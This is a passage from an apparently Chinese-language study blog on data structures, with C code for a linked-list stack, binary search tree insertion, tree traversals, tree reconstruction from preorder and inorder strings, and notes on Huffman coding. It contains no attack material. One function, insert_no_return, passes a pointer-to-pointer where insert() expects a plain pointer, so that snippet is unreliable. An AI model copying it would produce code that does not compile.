(!empty(<span class="hljs-built_in">stack</span>)) &#123;<br>        ans = ans + n + <span class="hljs-number">1</span> - top(<span class="hljs-built_in">stack</span>).id - <span class="hljs-number">1</span>;<br>        pop(<span class="hljs-built_in">stack</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, ans);<br>    <span class="hljs-built_in">clear</span>(<span class="hljs-built_in">stack</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="链表实现栈">链表实现栈</span></h3><p>使用一个带有dummy node的链表</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ERROR 0;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OK 1;</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125; Node, *Node_p;<br><br><span class="hljs-comment">// 设计为带有dummy head的链表</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stack</span> &#123;</span><br>    Node *head;<br>    <span class="hljs-keyword">int</span> len;<br>&#125; Stack, *Stack_p;<br><br><span class="hljs-function">Node *<span class="hljs-title">initNode</span><span class="hljs-params">(<span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node *n = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    n-&gt;val = val;<br>    n-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-function">Stack *<span class="hljs-title">initStack</span><span class="hljs-params">()</span> </span>&#123;<br>    Stack_p s = (Stack_p)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Stack));<br>    s-&gt;head = initNode(<span class="hljs-number">-1</span>);<br>    s-&gt;len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">push</span><span class="hljs-params">(Stack_p s, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!s) <span class="hljs-keyword">return</span> ERROR;<br>    Node_p node = initNode(val);<br>    node-&gt;next = s-&gt;head-&gt;next;<br>    s-&gt;head-&gt;next = node;<br>    s-&gt;len++;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeNode</span><span class="hljs-params">(Node_p n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n) <span class="hljs-built_in">free</span>(n);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pop</span><span class="hljs-params">(Stack_p s)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!s || !s-&gt;head || !s-&gt;head-&gt;next) <span class="hljs-keyword">return</span> ERROR;<br>    Node_p tmp = s-&gt;head-&gt;next;<br>    s-&gt;head-&gt;next = s-&gt;head-&gt;next-&gt;next;<br>    freeNode(tmp);<br>    s-&gt;len--;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">top</span><span class="hljs-params">(Stack_p s)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!s || !s-&gt;head || !s-&gt;head-&gt;next) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">return</span> s-&gt;head-&gt;next-&gt;val;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">empty</span><span class="hljs-params">(Stack_p s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (!s || !s-&gt;head || !s-&gt;head-&gt;next);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeStack</span><span class="hljs-params">(Stack_p s)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!s || !s-&gt;head) <span class="hljs-keyword">return</span>;<br>    Node *p = s-&gt;head, *tmp;<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        tmp = p;<br>        p = p-&gt;next;<br>        freeNode(tmp);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showStack</span><span class="hljs-params">(Stack_p s)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!s || !s-&gt;head) <span class="hljs-keyword">return</span>;<br>    Node_p p = s-&gt;head-&gt;next;<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        (p != s-&gt;head-&gt;next) &amp;&amp; <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, p-&gt;val);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    srand(time(<span class="hljs-literal">NULL</span>));<br>    Stack_p s = initStack();<br>    <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">while</span> (cnt--) &#123;<br>        <span class="hljs-keyword">int</span> val = rand() % <span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">int</span> opt = rand() % <span class="hljs-number">4</span>;<br>        <span class="hljs-keyword">switch</span> (opt) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"push %d, %s\n"</span>, val, push(s, val) ? <span class="hljs-string">"SUC"</span>: <span class="hljs-string">"ERROR"</span>);<br>                showStack(s);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                empty(s) ? <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Nothing to pop.\n"</span>) : <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Pop.\n"</span>);<br>                pop(s);<br>                showStack(s);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nFinal: \n"</span>);<br>    showStack(s);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="树">树</span></h2><h3><span id="定义">定义</span></h3><h4><span id="基本概念">基本概念</span></h4><p>分支度：节点拥有的子节点个数。</p><p>阶层：从根节点层往下，阶层从 1 往下依次增加。</p><p>高度（深度）：树的最大阶层值。⾼度和深度是相反的， ⾼度是从下往上数，深度是从上往 下。 因此根节点的深度和叶⼦节点的⾼度是 1。</p><p>祖先：某节点到根节点的路径上所有节点都是该节点祖先。</p><p>树林：多个数的集合。</p><p>歪斜树：所有节点只有左孩子，左歪斜树。右歪斜树同理。</p><h4><span id="满二叉树">满二叉树</span></h4><p>一个二叉树，如果每一个层的结点数都达到最大值，则这个二叉树就是满二叉树。也就是说，如果一个二叉树的层数为 k，且结点总数是<span class="math inline">\(2^k -1\)</span> ，则它就是满二叉树。</p><h4><span id="完全二叉树">完全二叉树</span></h4><p>一棵深度为k的有n个结点的二叉树，对树中的结点按从上至下、从左到右的顺序进行编号，如果编号为i（1≤i≤n）的结点与满二叉树中编号为i的结点在二叉树中的位置相同，则这棵二叉树称为完全二叉树。</p><h4><span id="性质">性质</span></h4><ol type="1"><li>二叉树第 <code>i</code> 层对多 <span class="math inline">\(2^{i-1}\)</span> 个节点。</li><li>层数为 k 的满二叉树节点数为 <span class="math inline">\(2^k-1\)</span>。</li><li>二叉树中，终端节点个数，等于度数为 2 的节点个数 + 1。</li><li></li></ol><h3><span id="遍历">遍历</span></h3><p>先序遍历时，遍历的顺序是从根结点开始，先访问当前结点，如果左子树不为空则继续访问左子树，之后若右子树不为空再访问右子树。在左右子树中依然按照这样的顺序进行遍历。</p><p>中序遍历的顺序是从当前结点的左子树开始遍历，再访问当前结点，最后访问右子树。</p><p>后序遍历先访问当前结点的左子树，再访问右子树，最后访问当前结点。</p><h3><span id="简单实现">简单实现</span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><br>&#125; Node;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Tree</span> &#123;</span><br>    <span class="hljs-keyword">int</span> len;<br>    Node *root;<br>&#125; Tree;<br><br><span class="hljs-function">Node* <span class="hljs-title">init</span><span class="hljs-params">(<span class="hljs-keyword">int</span> data)</span> </span>&#123;<br>    Node *node =(Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    node-&gt;data = data;<br>    node-&gt;lchild = <span class="hljs-literal">NULL</span>;<br>    node-&gt;rchild = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-comment">// 保持二叉搜索树结构，插入值</span><br><span class="hljs-function">Node *<span class="hljs-title">insert</span><span class="hljs-params">(Node *root, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!root) &#123;<br>        Node *n =  init(val);<br>        <span class="hljs-keyword">return</span> n;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (root-&gt;data &lt; val) &#123;<br>        root-&gt;rchild = insert(root-&gt;rchild, val);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        root-&gt;lchild = insert(root-&gt;lchild, val);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br><br><span class="hljs-comment">// 保持二叉搜索树结构，插入值. 不返回指针，直接在原地址中操作。</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert_no_return</span><span class="hljs-params">(Node **raddr, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!(*raddr)) &#123;<br>        *raddr =  init(val);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((*raddr)-&gt;data &lt; val) &#123;<br>        (*raddr)-&gt;rchild = insert(&amp;((*raddr)-&gt;rchild), val);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        (*raddr)-&gt;lchild = insert(&amp;((*raddr)-&gt;lchild), val);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert_tree</span><span class="hljs-params">(Tree *t, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!t) <span class="hljs-keyword">return</span>;<br>    t-&gt;root = insert(t-&gt;root, val);<br>    t-&gt;len++;<br>&#125;<br><br><span class="hljs-function">Node* <span class="hljs-title">build_demo</span><span class="hljs-params">()</span> </span>&#123;<br>    Node *node = init(<span class="hljs-number">1</span>);<br>    node-&gt;lchild = init(<span class="hljs-number">2</span>);<br>    node-&gt;rchild = init(<span class="hljs-number">3</span>);<br>    node-&gt;lchild-&gt;lchild = init(<span class="hljs-number">4</span>);<br>    node-&gt;lchild-&gt;rchild = init(<span class="hljs-number">5</span>);<br>    node-&gt;rchild-&gt;rchild = init(<span class="hljs-number">6</span>);<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">preorder</span><span class="hljs-params">(Node *node)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, node-&gt;data);<br>    <span class="hljs-keyword">if</span> (node-&gt;lchild != <span class="hljs-literal">NULL</span>) &#123;<br>        preorder(node-&gt;lchild);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (node-&gt;rchild != <span class="hljs-literal">NULL</span>) &#123;<br>        preorder(node-&gt;rchild);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">inorder</span><span class="hljs-params">(Node *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node-&gt;lchild != <span class="hljs-literal">NULL</span>) &#123;<br>        inorder(node-&gt;lchild);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, node-&gt;data);<br>    <span class="hljs-keyword">if</span> (node-&gt;rchild != <span class="hljs-literal">NULL</span>) &#123;<br>        inorder(node-&gt;rchild);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">postorder</span><span class="hljs-params">(Node *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node-&gt;lchild != <span class="hljs-literal">NULL</span>) &#123;<br>        postorder(node-&gt;lchild);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (node-&gt;rchild != <span class="hljs-literal">NULL</span>) &#123;<br>        postorder(node-&gt;rchild);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, node-&gt;data);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Node *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node-&gt;lchild != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">clear</span>(node-&gt;lchild);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (node-&gt;rchild != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">clear</span>(node-&gt;rchild);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(node);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear_tree</span><span class="hljs-params">(Tree *t)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (t-&gt;root)<br>        <span class="hljs-built_in">clear</span>(t-&gt;root);<br>    <span class="hljs-built_in">free</span>(t);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="已知先序和中序求后序遍历">已知先序和中序求后序遍历</span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><br>&#125; Node;<br><br><span class="hljs-function">Node* <span class="hljs-title">init</span><span class="hljs-params">(<span class="hljs-keyword">int</span> data)</span> </span>&#123;<br>    Node *node =(Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    node-&gt;data = data;<br>    node-&gt;lchild = <span class="hljs-literal">NULL</span>;<br>    node-&gt;rchild = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">postorder</span><span class="hljs-params">(Node *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node-&gt;lchild != <span class="hljs-literal">NULL</span>) &#123;<br>        postorder(node-&gt;lchild);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (node-&gt;rchild != <span class="hljs-literal">NULL</span>) &#123;<br>        postorder(node-&gt;rchild);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, node-&gt;data);<br>&#125;<br><br><span class="hljs-comment">// 根据先序和中序建立二叉树的函数 build</span><br><span class="hljs-function">Node *<span class="hljs-title">build</span><span class="hljs-params">(<span class="hljs-keyword">char</span> pre_str[], <span class="hljs-keyword">char</span> in_str[], <span class="hljs-keyword">int</span> len)</span> </span>&#123;<br>    Node *p = init(pre_str[<span class="hljs-number">0</span>] - <span class="hljs-string">'0'</span>);<br>    <span class="hljs-keyword">int</span> pos = <span class="hljs-built_in">strchr</span>(in_str, pre_str[<span class="hljs-number">0</span>]) - in_str;<br>    <span class="hljs-keyword">if</span> (pos &gt; <span class="hljs-number">0</span>) &#123;<br>        p-&gt;lchild = build(pre_str + <span class="hljs-number">1</span>, in_str, pos);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (len - pos - <span class="hljs-number">1</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        p-&gt;rchild = build(pre_str + pos + <span class="hljs-number">1</span>, in_str + pos + <span class="hljs-number">1</span>, len - pos - <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Node *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node-&gt;lchild != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">clear</span>(node-&gt;lchild);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (node-&gt;rchild != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">clear</span>(node-&gt;rchild);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(node);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> pre_str[] = <span class="hljs-string">"136945827"</span>;<br>    <span class="hljs-keyword">char</span> in_str[] = <span class="hljs-string">"963548127"</span>;<br>    <br>    Node *root = build(pre_str, in_str, <span class="hljs-built_in">strlen</span>(pre_str));<br>    postorder(root);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>    <br>    <span class="hljs-built_in">clear</span>(root);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="huffman编码">Huffman编码</span></h3><p>1952 年由 David A. Huffman 提出的一种无损数据压缩的编码算法。</p><p>哈夫曼编码先统计出每种字母在字符串里出现的<strong>频率</strong>，根据频率建立一棵<strong>路径带权的二叉树</strong>，也就是哈夫曼树。</p><p>树上每个结点存储字母出现的频率，根结点到结点的路径即是字母的编码，<strong>频率高</strong>的字母使用<strong>较短的编码</strong>，频率低的字母使用较长的编码，这样使得编码后的字符串占用空间最小。</p><h4><span id="实现方法">实现方法</span></h4><p>首先统计每个字母在字符串里出现的频率，把每个字母看成一个结点，结点的权值即是字母出现的频率。</p><p>把每个结点看成一棵只有根结点的二叉树，一开始把所有二叉树（结点）都放在一个集合里，接下来开始如下编码：</p><p>步骤一：从集合里取出两个根结点权值最小的树<code>a</code>和<code>b</code>，构造出一棵新的二叉树<code>c</code>，二叉树<code>c</code>的根结点的权值为<code>a</code>和<code>b</code>的根结点权值和，二叉树<code>c</code>的左右子树分别是<code>a</code>和<code>b</code>。（合并）</p><p>步骤二：将二叉树<code>a</code>和<code>b</code>从集合里删除，把二叉树<code>c</code>加入集合里。（更新候选）</p><p>重复以上两个步骤，直到集合里只剩下一棵二叉树，最后剩下的就是哈夫曼树了。</p><p>规定每个有孩子的结点，到左孩子的路径为<code>0</code>，到右孩子的路径为<code>1</code>。每个字母的编码就是根结点到字母对应结点的路径。</p><h3><span id="广义表">广义表</span></h3><p>示例：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/Notes_pic/2021/10/03/21-28-05-a3b2ab.png" srcset="/img/loading.gif" lazyload alt="示例" style="zoom:80%;"></p><p>广义表为：(5 ( 3 ( 1, 4 ), 6 (, 8 ( 7, ) ) ) )</p><p>实现根据广义表输入，构建树。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 